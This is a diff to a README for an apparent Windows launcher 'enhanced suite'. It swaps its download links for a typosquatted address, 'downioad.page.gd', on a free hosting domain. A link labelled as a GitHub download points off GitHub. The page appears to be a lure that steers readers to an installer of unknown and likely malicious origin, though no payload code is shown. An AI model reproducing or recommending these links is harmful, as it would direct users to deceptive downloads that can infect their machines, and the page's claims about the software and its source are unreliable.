@@ -2,7 +2,7 @@
 
 MKDEV Launcher 2026 Enhanced Desktop Suite is a powerful tool designed to elevate your MKDEV Launcher experience. This suite offers advanced customization, performance optimization, and user-friendly management features for Windows 10 and 11 users. It provides a seamless way to tailor your launcher to specific needs while ensuring system stability and efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ The software primarily focuses on launcher-specific settings and optimizations. 
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides direct access to the most recent release, including all new features and improvements.
 
